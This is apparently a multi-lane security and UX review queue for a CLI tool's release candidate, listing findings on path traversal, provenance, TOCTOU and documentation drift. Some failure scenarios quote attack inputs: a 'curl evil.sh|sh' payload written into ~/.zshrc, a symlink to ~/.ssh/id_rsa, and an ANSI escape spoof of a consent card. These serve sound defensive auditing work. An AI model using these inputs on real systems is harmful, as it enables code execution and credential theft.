# v0.18.0-rc.1 review findings — the rc.2 blocker queue

> **Status:** open work queue. Produced 2026-08-01 from a five-lane review of the
> strategy-v2 implementation arc (`git diff 5e10da5..HEAD`, the byte-set behind
> `v0.18.0-rc.1`). **Verdict: do not recruit on this byte-set; fix the BLOCKING
> set, re-cut rc.2.**
>
> **This is a review record, not direction.** Direction is `STRATEGY.md`; the
> ordered product queue is `TODO.md`. When an item here is fixed and verified,
> check it off here and, if it changes a contract, reflect it in the owning doc.

## How to read this

- **Confidence** = how many independent reviewers hit it. Five lanes ran:
  `SEC` (security, opus), `CONF` (strategy conformance, opus), `UX` (product +
  doc honesty, opus, verified live against the rc.1 binary), `RC` (release
  mechanics, sonnet), `CODEX` (gpt-5.6 Sol, high — independent second opinion,
  scoped to the trust/core/policy diff + provenance). A finding confirmed by
  2+ lanes is high-confidence; single-lane findings are marked.
- **Severity** = BLOCKING (must fix before the study byte-set), SHOULD-FIX
  (before real users touch that path), NIT.
- Every item carries the invariant/rule at stake, a `file:line`, a concrete
  failure scenario, and a fix shape. Line numbers are as of HEAD `5ae005e`;
  re-confirm before editing.

## The one theme behind most of the blockers

Two invariants — **"all repository content is hostile input" (inv. 7)** and
**"authority and dispatch stay single-path" (inv. 6)** — are being defended by
*string conventions* and by *"this enum has no variant"* rather than by types.
The `↳` next-action channel and the `entry.kind` path segment are the same
failure: safe while their inputs were compile-time literals, unsafe the moment
repository/bundle bytes flowed through without the type changing. Several
witnesses passed because they tampered with the field the author was thinking
about (`entry.path`, the checked `Level::Unchecked` phrases) rather than the one
that moved. Fixing the sites is necessary; the durable fix is to make hostile
strings a distinct type from author-literal strings at the presentation and
grant boundaries. Track this as the acceptance lens for the whole queue, not a
separate item.

---

# BLOCKING — must fix before the study byte-set

## F1 — Bundle `entry.kind` escapes the quarantine before consent is shown
- **Confidence:** HIGH (SEC B1 + UX #2, both reproduced live)
- **Invariant:** 7 (hostile input), 3 (untrusted content inert); defeats the
  module's own headline claim and the Phase 1 decline property.
- **Location:** `crates/cli/src/quarantine.rs:96-109` (`staged.join(&entry.kind).join(&entry.path)`); staging at `crates/cli/src/commands/share.rs:269,282`, *before* the card at `share.rs:285`. `read_bounded` (`share.rs:360-385`) bounds `path`/`name`/`body` but never `kind`.
- **Failure scenario:** a bundle entry `{"name":"a","kind":"../../../../..","path":".zshrc","body":"curl evil.sh|sh\n"}`. `check_relative` validates `entry.path` only; `Path::starts_with` at `quarantine.rs:101` is component-wise and does **not** normalize `..` (verified: `kind="../../skills"` → `starts_with_staged=true`). Bytes land at `~/.zshrc` before the card prints; the user declines; `discard()` removes only `quarantine/<id>/`; the escaped file survives. `fs::write` overwrites unconditionally.
- **Why the witness missed it:** `share_round_trip.rs:299-322` tampers `entries[0].path` (the checked field), never `kind`.
- **Fix shape:** reject any `kind` outside `{"skill","instruction"}` (the only two `adopt` reads); canonicalize before the `starts_with` backstop; add a witness that tampers `kind`.

## F2 — URL intake stages every object-shaped JSON as a skill body; connection/registry governance is dead for URLs
- **Confidence:** HIGH (SEC B2, and reconciled with CONF: the passing `a_fetched_credential_becomes_a_ref` test exercises the **local-path** branch; the URL branch is unwitnessed).
- **Invariant:** 5 (secrets never serialize), 7; the feature's entire safety argument (de5c37d: "a CONNECTION reports rather than writes", "credentials become `${REF}`", "a REGISTRY only lists") is false for the URL path.
- **Location:** `crates/cli/src/commands/intake_external.rs:196-199` (`fetch_url` hard-codes `files: vec![("SKILL.md", body)]`) and `:280` (shape dispatch `path.ends_with(".json") || trimmed.starts_with('[')` — first disjunct always false for URLs, so only array bodies reach the JSON branch). Object-shaped connection JSON falls through to `parse_skill_package`; `is_root_skill_md("SKILL.md")` matches (`eve.rs:144`); no content check.
- **Failure scenario:** `agentstack add from https://registry.example/acme.json` serving `{"name":…,"command":…,"env":{"ACME_API_KEY":"sk-live-…"}}`. `parse_connection` / `redact_map` / `${REF}` never run. Card says `Adds 1 file(s)`. On yes, `.agentstack/skills/acme/SKILL.md` holds the live key, in the project, loaded into agent context on the next `use --write`.
- **Fix shape:** run the same shape-detection + `parse_connection`/redaction on URL bodies that local paths get; preserve real filename/shape from `fetch_url`; add end-to-end witnesses for the **network** branch (all current tests in `external_intake.rs` use local paths).

## F3 — Provenance laundering: intake output is labeled "your own work" and gets the compressed path
- **Confidence:** HIGH (SEC B3 + CODEX #6 + UX #10)
- **Invariant:** 8 (claims match enforcement); STRATEGY.md floor "provenance gates compression".
- **Location:** `crates/cli/src/quarantine.rs:154` (`adopt` lands in `dir.join("skills")` = `.agentstack/skills/`) → `crates/cli/src/intake.rs:504-514` (`classify` returns `LocallyAuthored("untracked in git")`) → `crates/cli/src/commands/yes.rs:53,140-143` (prints `your own work — untracked in git`).
- **Failure scenario:** any supply route that writes into the scanned dir *after* clone — `receive`/`add from` (F1/F2), a repo build/postinstall/devcontainer hook, or an agent with shell access — produces the "locally authored" label for a stranger's bytes. Outside a git work tree (`intake.rs:516-519`) the fallback is bare mtime vs last grant — any process can `touch`.
- **Not exploitable via `.gitignore` alone:** a gitignored file isn't in the index, so a clone can't deliver it (SEC + CODEX agree). The defect is the false attestation, not (yet) a skipped review — `yes` requires a TTY (`yes.rs:98-105`) and routes through the full surface walk, so the *evidence* is not compressed, only the command count and the authorship label.
- **Fix shape:** provenance must prove authorship, not "git didn't deliver this / mtime is newer". Options to decide in the fix: gate the "your own work" label on a positive signal (created in this session under observation, or a content hash the tool itself deposited), and never let `adopt`/intake output qualify for the compressed authorship label. At minimum, content that arrived via `receive`/`add from` must be tagged clone-supplied through to the card.

## F4 — Keep-pinned serves an unverified, symlink-followable snapshot
- **Status: ✅ FIXED** 2026-08-01 (`fix/consent-edges-f4-f5-f6`). Keep-pinned
  delivery now serves a snapshot only if `store::verified_snapshot` re-proves
  it (re-hash to its digest name + symlink rejection), failing closed to
  exclusion with its own honest line; `snapshot_content` verifies what landed
  after the copy and removes/refuses on mismatch (the mixed-bytes window);
  the re-gate diff reader (`diff_against_pin`) verifies under both pin
  families before presenting bytes as "approved". Bonus hazard closed:
  `record_lock`/`record_instruction_pins` no longer re-pin items under a
  standing decision (the absorb path that would quietly erase a decline).
  Witnesses tamper the snapshot content itself: edited bytes + a symlink at
  key material (`keep_pinned_delivery_refuses_a_tampered_snapshot`),
  mislabeled deposit (`snapshot_content_refuses_bytes_that_do_not_hash_to_the_name`),
  both families (`verified_content_rejects_tampering_under_either_family`),
  and the absorb path (`use_write_never_repins_a_decided_skill`,
  re-lock assertion inside `an_instruction_keep_pinned_compiles_the_approved_bytes`).
- **Confidence:** HIGH (SEC S1 + CODEX #5 + UX #7)
- **Invariant:** 4 (no cache on a verification path); the one path whose purpose is "the approved bytes are what agents load" (60c250a).
- **Location:** `crates/cli/src/commands/use_profile.rs:573-590` selects `store/content/<hex>` on `snapshot.is_dir()` alone — no `verified_snapshot` re-hash (contrast `store.rs:245-251`, which literally documents this bug), no `reject_symlinks` (contrast every other content read in `store.rs`); `:618` excludes keep-pinned from the fail-closed drift gate. `materialize`/`copy_dir_all` (`render/skills.rs:217`) hands symlinks to `fs::copy` → copies the target's bytes. Newly-copied snapshot returned unverified after rename at `store.rs:261-273`.
- **Failure scenario:** plant `~/.agentstack/store/content/<hex>/leak.md -> ~/.ssh/id_rsa`; next `use --write` copies the key into every harness's skills dir. `regate::read_tree` skips symlinks, so the review card never shows it. Or: repo files change between `Store::pin`'s pre-copy rehash and `copy_dir_all` → mixed bytes land under the approved digest.
- **Fix shape:** re-hash the snapshot against its digest-name on read (reuse `verified_snapshot`); reject symlinks on the keep-pinned delivery path as everywhere else; bring keep-pinned under the same drift gate.

## F5 — TOCTOU: re-gate `accept` approves bytes different from those displayed
- **Status: ✅ FIXED** 2026-08-01 (`fix/consent-edges-f4-f5-f6`).
  `PendingAnswer` now captures the live content's digest at staging time,
  hashed BEFORE the diff renders; the commit point re-hashes and refuses
  through one gate (`refuse_undisplayed`) unless fresh == displayed — for
  both pin families, before the lock is saved or the grant recorded, so a
  refusal leaves everything untouched. A `None` displayed digest also
  refuses (fail closed). Witness tampers the field that moved — the live
  bytes after display (`accept_refuses_bytes_that_were_not_displayed`);
  the happy path is covered by the existing accept-repins e2e witnesses.
- **Confidence:** HIGH (SEC S2 + CODEX #1)
- **Invariant:** 4 (pinned byte changes re-gate), exact-byte consent.
- **Location:** diff read at `crates/cli/src/commands/trust.rs:1011`; commit point independently re-reads at `trust.rs:1511` and writes that checksum to the lock. `PendingAnswer` (`trust.rs:1607-1620`) captures no digest at diff time. The comment at `trust.rs:1535-1539` reasons correctly about exactly this hazard for lock/manifest, while the skill-body path does the disk re-read it warns against.
- **Failure scenario:** user reviews benign state B; a checkout/sync/adversarial writer replaces it with M in the human-scale window before the closing `Apply: accept X?`; M is hashed, pinned, and granted un-displayed. `Store::pin`'s re-hash guard passes, so the next re-gate reads "unchanged".
- **Fix shape:** capture the displayed content's digest in `PendingAnswer` at diff time; at commit, verify the live bytes still match that digest or re-gate; bind the grant to the reviewed digest, not a fresh read.

## F6 — Instruction re-gate cannot correctly implement any answer
- **Status: ✅ FIXED** 2026-08-01 (`fix/consent-edges-f4-f5-f6`). The commit
  point branches by kind: instruction accepts pin via `pin_instruction` and
  patch `patched.instructions` (no more `dir_digest`-on-a-file error after
  consent). The compiler (`plan_instructions`) now reads standing decisions:
  blocked fragments are excluded (and scrubbed from an already-compiled
  region), keep-pinned fragments compile from the verified store copy —
  never the live file — failing closed to exclusion; every compile surface
  (`instructions`, `apply`) prints the exclusions, and the write drift gates
  exempt decided fragments exactly as `use` does for skills. Witnesses in
  `regate_staging.rs`: `an_instruction_regate_accept_repins_and_stays_trusted`,
  `an_instruction_keep_pinned_compiles_the_approved_bytes`,
  `a_blocked_instruction_never_reaches_the_managed_region`.
- **Confidence:** HIGH (SEC S3 + CODEX #4 + UX)
- **Invariant:** claims match enforcement; the headline consent moment errors on first use for instructions.
- **Location:** instruction drift stages a **file** path (`trust.rs:1119`; `render/instructions.rs:148-155`), but `Accept` runs it through `dir_digest(live)` (`trust.rs:1509-1523`) and a **skills-only** lock update (`trust.rs:1521`, `patched.skills`) instead of `pin_instruction`/`patched.instructions`. `KeepPinned`/`Block` are ignored by the compiler, which reads the live file (`render/instructions.rs:62`). Zero instruction coverage in `regate_staging.rs`.
- **Failure scenario:** accept an instruction re-gate → `dir_digest` gets a file → `Err` → `?` aborts the command *after* the user consented. Keep-pinned stores dead state (`instructions.rs:45` then blocks the compile). Block is bypassed once live bytes match the lock again.
- **Fix shape:** route instruction answers through `pin_instruction` + `patched.instructions`; make the compiler honor keep-pinned/block for instructions; add instruction cases to `regate_staging.rs`.

## F7 — `init` is a second, non-content-bound grant path over repo config
- **Status: ✅ FIXED** 2026-08-01 (`fix/universality-f7-f8`). `detect_import`
  now tracks whether any server that LANDED in the merged manifest came from
  a project-scope config (`project_sourced`; merge-losing conflicts don't
  count), and the H1 convenience grant is withheld whenever it did — the
  import still happens, the project meets the ordinary `agentstack trust .`
  review, and init says so with the exact next command. The H1 comment now
  states the boundary instead of the stale "reads ONLY machine-global"
  claim. Witnesses in `project_scope_discovery.rs`: the tamper is the grant
  itself (`init_over_repo_supplied_config_imports_but_never_self_trusts`),
  plus the counter-witness that machine-global imports keep the H1 grant
  (`init_over_machine_global_config_still_grants`).
- **Confidence:** HIGH (CODEX #2)
- **Invariant:** 6 (single grant/authority path) — the review-event class the repo treats as line-by-line.
- **Location:** `crates/cli/src/commands/init.rs:311` (`init --yes` promptless), `:556` (imports project config), `:1624` (calls `trust::trust_reviewed` directly). The claim at `init.rs:1485` that only global config is read is contradicted by `:556`.
- **Failure scenario:** a clone ships `.mcp.json` with a stdio server `sh -c ...`; documented `agentstack init --yes` (in automation) imports and trusts it with no funnel and no consent digest bound to reviewed bytes.
- **Fix shape:** `init` must not grant trust over project-supplied config without the funnel/digest; either route project imports through the same gated grant as everything else, or restrict `init` to genuinely global config and make that true in code. Reconcile with the known study-watch note (`init` importing only global-scope configs) — the fix must not silently widen it.

## F8 — Standing Block / KeepPinned decisions are enforced only on `use`
- **Status: ✅ FIXED** 2026-08-01 (`fix/universality-f7-f8`). Standing
  decisions are now consulted at every load/grant seam: the MCP loader
  refuses blocked skills and serves keep-pinned ones from the verified store
  copy (fail closed on tamper, `origin: "approved-copy"`, drift warning
  attached); the MCP catalog stops advertising blocked skills and describes
  keep-pinned ones from the approved bytes; locked runs refuse loudly on a
  blocked item (keep-pinned needs no arm there — drift already fails strict
  verification). Together with the F6 compiler enforcement and the F4
  record-lock skip, every load path now honors the answers. Witnesses tamper
  the bypass the finding names — live bytes restored to approved so every
  drift check passes: `a_standing_block_holds_on_the_mcp_load_path`,
  `keep_pinned_serves_the_approved_copy_on_the_mcp_load_path` (both in
  `mcp_server.rs`), `a_standing_block_refuses_a_locked_run`
  (`regate_staging.rs`).
- **Confidence:** HIGH (CODEX #3)
- **Invariant:** a refusal must hold on every load path, not one.
- **Location:** only `use_profile.rs:557` consults decisions. Bypassed by: MCP catalog reading live frontmatter (`mcp_server.rs:2015`), MCP load checking the lock but not decisions (`mcp_server.rs:2211`), locked execution constructing grants without them (`locked.rs:568`).
- **Failure scenario:** user blocks a changed skill; restoring its old pinned bytes makes MCP/locked execution load it anyway. Or after an unrelated re-grant preserves the decision (`trust/lib.rs:493`), MCP loads a newly-pinned version despite the standing block.
- **Fix shape:** consult standing decisions at every load/grant seam (MCP catalog, MCP load, locked exec), not just `use`; add witnesses on each path.

## F9 — `agentstack yes` is orphaned from every surface that detects a dropped file (study-validity blocker)
- **Status: ✅ FIXED** 2026-08-01 (`fix/f9-yes-reachability`). All four detection
  surfaces now route drops to `agentstack yes`: `next_step` (new
  `undeclared_drops` input, outranking everything except a `Changed` re-review
  and the clean-at-rest session rhythm), the orientation `Dropped` pointer,
  doctor's per-item advisory, and the `use`/`lock` in-passing notice
  (`intake::notice`). The JSON `next_action` inherits it. Witnesses tamper the
  field that moved — the recommended *command*: unit
  (`a_waiting_drop_routes_to_yes`, all signal combinations) + end-to-end
  against the real binary (`a_drop_routes_status_and_doctor_to_yes` in
  `intake_funnel.rs`, asserting the `Next:` headline and each pointer).
- **Confidence:** HIGH (UX, verified live) — **not a security bug, but the single most important item for study validity.**
- **Rule:** the study measures whether five strangers reach the funnel; it must be reachable.
- **Location:** `yes` appears outside its own module only at `cli.rs:55`. Detection surfaces route elsewhere: `overview.rs:639` → `agentstack adopt`; `doctor.rs:1030` → `↳ agentstack adopt`; `next_step` can never return `agentstack yes`; the one-next-action after a drop is `agentstack trust .` "to unlock its servers" on a project with **0 servers**.
- **Failure scenario:** a participant drops a file, is told to run `adopt`/`trust .`, never sees `yes`. Appendix A scores it as a discovery failure — a routing bug misread as a product-thesis failure, the exact false-negative the study exists to avoid.
- **Fix shape:** wire `next_step` and `print_intake_line` (the intake notice) to recommend `agentstack yes` when undeclared drops are present. Small change; prerequisite for the study regardless of the security fixes.

## F10 — `undo` after `yes` reports success while the capability is still live
- **Confidence:** HIGH (UX, verified live)
- **Rule:** the recovery rung must be honest; "green means verified".
- **Location:** success line `yes.rs:231` and `undo.rs:223` print `✓ back to before yes / nothing else touched`, but `ls .claude/skills/` still shows the skill and the manifest still declares it. The disclosure exists only in the *preview* (`yes.rs:157-158`: "`agentstack use --write` then reconciles what each CLI holds"), not on the success/undo line.
- **Failure scenario:** user undoes, believes they are back to before, capability is still delivered to every harness.
- **Fix shape:** either undo reconciles the rendered harness state too, or the success line states plainly what undo did and did not retract and names the command that completes it.

## F11 — Status/doctor are green over drifted approved content
- **Confidence:** HIGH (UX verified live + CONF notes the `readiness` gap) — the surface 8bc2538 ("green that means verified") claimed to fix.
- **Location:** after editing an approved skill body, `status` shows `locked · trusted`, `doctor` shows `✓ hello present · SKILL.md ok`, `0 errors`. Drift surfaces only under `agentstack trust .`, which nothing recommends. `readiness` (`doctor.rs:354-373`) never consults `self.sections` — no coverage term — so a manifest reduced to `version = 1` with a leftover lockfile reports `readiness = ready`; and `readiness` is JSON-only (terminal prints `0 errors, 0 warnings`).
- **Fix shape:** status/doctor must detect content drift against pins on the default path and surface it with a next action; `readiness` needs a coverage term so "ready" cannot be reported over zero coverage; mirror the JSON readiness verdict to the terminal.

---

# SHOULD-FIX — before real users touch these paths

## F12 — Ctrl-C at the `yes` prompt leaves declared state with no undo row
- **Confidence:** MED (UX verified live)
- **Location:** `yes.rs:186` captures rollback and `yes.rs:217` records history *after* the grant. The `yes.rs:185` comment ("'cancelled — nothing happened' has to be literally true") holds only for a typed `n`.
- **Scenario:** SIGINT (the natural "I'm not sure") leaves the manifest declared and the lock written; then `undo` says "nothing recorded", `yes` says "nothing new to activate", `status` says `trust .` on a 0-server project. Related to F10; also a SIGKILL window between write and record.
- **Fix shape:** install the interrupt handler / rollback around the write so cancel is transactional; or record the undo row before the writes it covers.

## F13 — Invalid signature is fail-open on the `--yes` accept path
- **Confidence:** MED (SEC S4)
- **Location:** `share.rs:275,286,314` — `Provenance` is computed, printed, then never consulted; `confirmed()` returns `true` on `args.yes` regardless. Witness (`share_round_trip.rs:177-211`) runs without `--yes`, so it only proves the decline path.
- **Scenario:** `receive hostile.astack --yes` treats a tampered bundle identically to a verified one.
- **Fix shape:** a failed/missing signature must change the headless outcome (refuse, or require an explicit override flag distinct from `--yes`); witness the `--yes` + bad-signature path.

## F14 — Unsanitized attacker text on the receive card
- **Confidence:** MED (SEC S5)
- **Location:** `share.rs:413-427` formats `Entry.license`/`origin` (unbounded, unchecked in `read_bounded`) straight into `outln!` (bare `writeln!`). `eve.rs:200` uses `text::sanitize_line` for exactly this; the share path does not.
- **Scenario:** `origin` containing `\x1b[5A\x1b[2K…` overwrites the `SIGNATURE DOES NOT MATCH` line before the prompt draws — a spoof of the consent card itself, on unsigned/invalid bundles.
- **Fix shape:** run `text::sanitize_line` (the ECMA-48 state machine already used on the trust/eve cards) on every attacker-supplied field at every render site; bound `license`/`origin` in `read_bounded`.

## F15 — `add from <url> --write` is the weakest headless-consent bar in the product, on the least-trustworthy content
- **Confidence:** MED (SEC S6)
- **Location:** `intake_external.rs:388-399` — `--write` alone suppresses the card in CI with no digest binding, while `yes.rs:98-105` refuses non-interactively and `trust` demands `--yes --consented-digest`. The non-TTY message tells the user to re-run with `--yes`, a flag `AddFromArgs` doesn't have.
- **Fix shape:** hold external intake to at least the `trust` bar (consent digest, or refuse headless); fix the message to name a flag that exists.

## F16 — `quarantine::adopt` containment is lexical and follows destination symlinks
- **Confidence:** MED (SEC S7)
- **Location:** `quarantine.rs:143-177` — source symlinks skipped, but `dest.starts_with(...)` is a string prefix test, `dest.exists()` follows links, `fs::copy` writes through one. Also `bail!` on collision (`:162`) fires *after* earlier files landed, and `intake_external.rs:351` propagates with no `discard` (contradicting `:115-116`).
- **Scenario:** a repo shipping `.agentstack/skills/foo` as a symlink to `~/.claude/` gets writes there.
- **Fix shape:** canonicalize + reject symlinked destinations; make partial-adopt failures roll back via `discard`.

## F17 — Local-path intake is unbounded (network half is bounded, local half is not)
- **Confidence:** MED (SEC S8 + CODEX #7/#8)
- **Location:** `intake_external.rs:222-273` reads the whole tree into memory with no size/count/depth cap; `eve.rs`'s `MAX_FILES`/`MAX_TOTAL_BYTES` apply at `:297`, after. Re-gate diff parsing has the same shape: `regate.rs:245-280` reads every file fully before `DIFF_LINE_CAP` (display-only). Provenance git query buffers unbounded stdout/stderr (`gitx.rs:171-213`), and `ok()?` discards the tracking signal on failure → mtime fallback.
- **Scenario:** a multi-GB file or huge tree exhausts memory / stalls `trust` *before* the consent gate renders.
- **Fix shape:** apply the `eve.rs` caps before reading, on the local intake path, the re-gate diff read, and the git query; on git-query failure, fail closed rather than falling back to mtime provenance.

## F18 — Attribution is dead at HEAD (the wire from intake to the lock was never connected)
- **Confidence:** HIGH (SEC S9 + UX + CONF)
- **Location:** every production `LockedSkill` writes `license: None, origin: None` (`store.rs:831`, `install.rs:286`, `use_profile.rs:1317/1642`, `mcp_server.rs:3007/3050`); `share.rs:237-239` hard-codes `None` outbound; `adopt` drops a received entry's attribution; `intake_external.rs` never touches `Lock`. Schema, `upsert` carry-forward, and `attribution_schema.rs` are correct — only the wire is missing. `ENFORCEMENT.md:825-827` claims it's "recorded per pinned skill" (false today).
- **Fix shape:** connect intake → `Lock::upsert` so `license`/`origin` are captured; until then, correct the ENFORCEMENT claim to match reality (see F19).

## F19 — Documentation claims run ahead of the code (claims-match-enforcement, inverted)
- **Confidence:** HIGH (UX, each checked against code)
- **Locations & corrections needed:**
  - `ENFORCEMENT.md:743` "every read re-hashes the directory" — false; `verified_snapshot` is write-path only, both readers (`regate.rs:76`, keep-pinned delivery `use_profile.rs:575`) do bare `is_dir()`. Stale echo at `store.rs:160`. (Ties to F4.)
  - `ENFORCEMENT.md:825-827` attribution "recorded per pinned skill" — false (F18).
  - `ENFORCEMENT.md:502` settings "not probed" — `doctor.rs:1618` opens a real Settings section; `TODO.md:540`'s `kind:settings:doctor` baseline claim is also wrong.
  - `seatbelt.rs:19-21` "`agentstack report` can show it later" — `report_text` has no arm for `SecretDenied`/`PinRejected`; reaches `--json` only.
  - `up.rs:171` "each CLI's config is held back whole — nothing written with a missing credential" — `apply.rs` blocks per artifact; instructions/settings/hooks still write (`apply.rs:916-918,1071`). `up.rs:201` `"nothing rendered —"` prints even after other targets committed, above apply's own `Wrote 3 of 4 targets`.
  - Green ticks over nothing: `doctor.rs:1946` `"✓ skipped (reads every skill body)"`; `doctor.rs:904` renders untrusted as `Level::Ok`.
- **Fix shape:** make each claim true in code, or correct the claim. Prefer code where it's a real gap (F4, F18); prefer doc correction where the honest scope is fine.

## F20 — `optimize` counts seatbelt audit records unfiltered (variant-overloading, one layer down)
- **Confidence:** MED (UX)
- **Location:** `seatbelt::record` writes `tool: "egress"|"secret"|"pin"` into the audit `CallRecord`; `optimize.rs:240-261` counts every record unfiltered — so a never-contacted server reports gateway calls and "denied by the tool firewall". This is exactly the overloading `recorder/src/lib.rs:465-475` refuses for `SecretAccess` at the recorder layer.
- **Fix shape:** filter seatbelt/denial records out of the brokered-call counts in `optimize`, or give them a distinct record kind the counter ignores. (See the `assert-effects-not-claims` / `secret-denied-not-an-outcome-field` house rules.)

## F21 — `status` and `doctor` name each other as the one next action
- **Confidence:** MED (UX) — the pilot Run A dead-end, reintroduced one surface over.
- **Location:** `overview.rs:214-217` ↔ `doctor.rs:319-322`. Also `doctor.rs:303-306` never consults `self.errors`, so a real error with no `↳` prints `1 error` above `next: agentstack status nothing to repair`.
- **Fix shape:** break the mutual referral; make the error path produce a real next action.

## F22 — `share`/`receive` never delivers the manifest or lock it advertises
- **Confidence:** MED (UX)
- **Location:** `share.rs:404` says "Brings a manifest — review and adopt what you want from it", but `run_receive` stages only `bundle.entries`; `quarantine::adopt` moves only `skill`/`instruction` subtrees. `bundle.manifest`/`bundle.lock` are parsed, counted on the card, then dropped. Servers, toolsets, policy, hooks do not survive the round trip.
- **Fix shape:** either deliver manifest/lock through a governed adopt, or stop advertising them on the card.

---

# CONFORMANCE / LEDGER — the map lagging the territory (doc fixes, not code)

## F23 — Two phase gates in STRATEGY.md still demand tester evidence that never existed
- **Status: ✅ FIXED** 2026-08-01 — both remaining gates amended in place with
  strikethrough in the 9ddb0ca style (Phase 2→3 loses the comprehension metric,
  Phase 3→4 loses "testers describe a blocked action"), and the Phase 0→1 gate
  now carries an explicit statement that the 2026-07-31 amendment is **blanket**
  over every inter-phase gate; `TODO.md`'s verbatim restatement of the Phase-3
  gate was amended to match.
- **Confidence:** HIGH (CONF D1)
- The 9ddb0ca amendment rewrote the Phase 0→1 and 1→2 gates in place (with strikethrough) but left Phase 2→3 (`STRATEGY.md:308-310`) and Phase 3→4 (`:342-344`) requiring "testers describe a blocked action correctly" — no tester ran, yet Phase 3 and 4 are marked complete. `TODO.md:208-210` restates the Phase-3 gate verbatim.
- **Fix shape:** amend the two remaining gates the same way the first two were, or state once that the blanket 2026-07-31 amendment covers all inter-phase gates.

## F24 — Phase 4 "trigger discipline" contradiction
- **Status: ✅ FIXED** 2026-08-01 — `STRATEGY.md`'s "Trigger discipline" bullet
  now strikes "starts on *user demand*" and records that the maintainer's
  finish-v2 directive was the actual trigger, pointing at the existing argument
  in `TODO.md`'s Phase 4 block; that block now points back, so the two agree.
- **Confidence:** HIGH (CONF D2)
- `STRATEGY.md:369-373` still says external intake "starts on user demand"; it shipped (de5c37d) with zero external users. The deviation is argued only at `TODO.md:347-353`.
- **Fix shape:** update the operative doc to record that the maintainer's finish-v2 directive is the trigger, or mark the sentence amended.

## F25 — `trust-review-card-v1` means two different payloads in two active docs
- **Status: ✅ FIXED** 2026-08-01 (doc only; `ui_contract.rs` untouched) — the
  shipped meaning wins: `docs/design/consent-card.md` §Panel no longer proposes
  the name for its unbuilt structured `ConsentCard` payload, carries a naming
  correction quoting what the binary actually advertises, renames the unbuilt
  payload to the working name `trust-card-diff-v1` (not `-v2`, which would
  falsely imply a migration path), and the doc's Status block now names
  `ui_contract.rs` as the single source of truth for feature strings.
- **Confidence:** HIGH (CONF D6) — the one deviation with an external consumer (the fork) on the other end.
- `docs/design/consent-card.md:322-330` (Status: Active) reserves the name for an unbuilt structured `ConsentCard` payload; `ui_contract.rs:32-36` ships it meaning something narrower (`trust --preview` extra fields). A fork built from the design doc would target a payload that does not exist.
- **Fix shape:** pick one meaning; version the other (`trust-review-card-v2` or a distinct name); reconcile the design doc's Status.

## F26 — §9.3 entry resurrects a discharged blocker
- **Status: ✅ FIXED** 2026-08-01 — the stale precondition is struck. There is
  no second §9.3 re-run: the loader landed (`b05fd26`) and §9.3 was discharged
  2026-07-23 with zero blocking findings. The entry now names what is actually
  open on that track — the five codex promotion findings (a)–(e) from the
  2026-07-29 cross-model pass and the remaining recurring-task occasions, both
  already listed under "Experimental workflows".
- **Confidence:** HIGH (CONF D3)
- `TODO.md:436` (added today, a5fca35) says the §9.3 re-run "is still blocked on the import-denying module loader", but `TODO.md:586,592,933` record that loader landed (b05fd26) and the §9.3 review was discharged 2026-07-23.
- **Fix shape:** strike the stale precondition, or, if a second distinct re-run exists, write its actual precondition.

## F27 — Two panel workstream halves dropped without a deferral entry
- **Status: ✅ FIXED** 2026-08-01 — `TODO.md`'s fork ledger (Phase 4 block,
  carried-forward item 3) is now a two-part list: the two rendering contracts it
  already covered, plus the two dropped halves by name — **panel-open as an
  intake touchpoint** and **the panel speaking the four ideas** — each stating
  that it is unbuilt and why it does not gate §1.6. Both `STRATEGY.md` sites
  (Phase 1 intake detection, Phase 3 vocabulary completion) now strike the panel
  and point at the ledger.
- **Confidence:** HIGH (CONF D4)
- `STRATEGY.md:237` ("panel open" as an intake touchpoint) and `:325` ("panel speaks the four ideas") are neither built nor in any deferral list. `panel_open`/`PanelOpen` appears nowhere in `crates/cli/src`. The fork ledger (`TODO.md:429-434`) covers only the two rendering contracts.
- **Fix shape:** add both to the fork/deferral ledger by name.

## F28 — Ledger inconsistencies in TODO.md (checked vs unchecked, dual-status sections)
- **Status: ✅ FIXED** 2026-08-01 — four reconciliations. (a) P0.2 checked off,
  matching its own body. (b) P3.7/P3.8: **the Phase-4 `[x]` marks are the
  truth** — `readiness`/`status-honesty-v1` and `RunEvent::PinRejected` are
  present in the shipped code, so the two standing sections became closed
  records pointing at the Phase 4 entries, with F11 named as a *new* finding
  against the shipped `readiness` (a missing coverage term) rather than a
  reopening of P3.7. (c) `STRATEGY.md` now names the shipped touchpoint set
  `{status, doctor, use, lock, adopt}` and moves panel-open to the deferral
  ledger (F27). (d) "recognition" split into **content-digest recognition**
  (P2.C — shortens the trust card's body) and **publisher-key recognition**
  (Phase 4 share — changes the receive card's words, does not shrink it), with
  the distinction stated at all four sites so the two claims stop reading as a
  contradiction.
- **Confidence:** HIGH (CONF D8/D9/D5/D10)
- P0.2 unchecked (`TODO.md:80`) while its body + `:64-69` + the amended gate say it shipped. P3.7/P3.8 stand as open sections (`:297-338`) while the Phase 4 block marks them `[x]` (`:355-374`). Intake touchpoint set drift: shipped `{status,doctor,use,lock,adopt}` vs strategy `{doctor,use,lock,panel open}`. "Recognition" names two mechanisms with opposite "card shrinks / does not shrink" claims (`:174-176` vs `:411-412`).
- **Fix shape:** reconcile each to one state; disambiguate "recognition" (content-digest vs publisher-key) with distinct nouns.

## F29 — Six-rung ladder is byte-identical in README only; cross-surface consistency is broken again
- **Status: ✅ FIXED** 2026-08-01 — one gloss set across all four surfaces
  (*import once, render everywhere · toolsets and temporary sessions · doctor
  and diff explain drift · keep an edit, or undo the write · locked,
  secret-free setups · trust, policy, confined runs*), taken from the pair that
  already agreed (`docs/start.html`, `docs/tutorial/index.html`) and applied to
  `README.md`'s ladder table and `docs/index.html`'s "Climb in six steps" cards.
  The stale `Unify · Verify · Guard · Trust · Scale · Confine` teaser box in the
  tutorial's lesson 1 is **deleted** — it was fully redundant with the canonical
  ladder in lesson 2. Those three pages are hand-authored HTML with no `.md`
  twin (the builder does not emit them); `make-docs-pages.py` was re-run and
  `check-docs-site.py` passes.
- **Confidence:** HIGH (UX vs CONF, reconciled)
- CONF is right that `README.md:148-153` rungs are byte-identical across the arc (fb4cc8c's narrow claim holds). UX is right that the *glosses* differ across `README.md`, `docs/index.html:185-205`, `docs/start.html:263-269`, and worse, `docs/tutorial/index.html:163-168` still shows the **old** ladder `Unify · Verify · Guard · Trust · Scale · Confine` two sections from the canonical one — the five-ladders regression `[[one-ladder-onboarding]]` fixed once already.
- **Fix shape:** re-run the one-ladder pass across all four surfaces; delete the stale tutorial ladder. This is a docs-site source edit → regenerate with `python3 tools/make-docs-pages.py` and verify with `check-docs-site.py`.

## F30 — Wording drift: `STRATEGY.md:8` "Current as of 0.17.x" vs `Cargo.toml` 0.18.0-rc.1
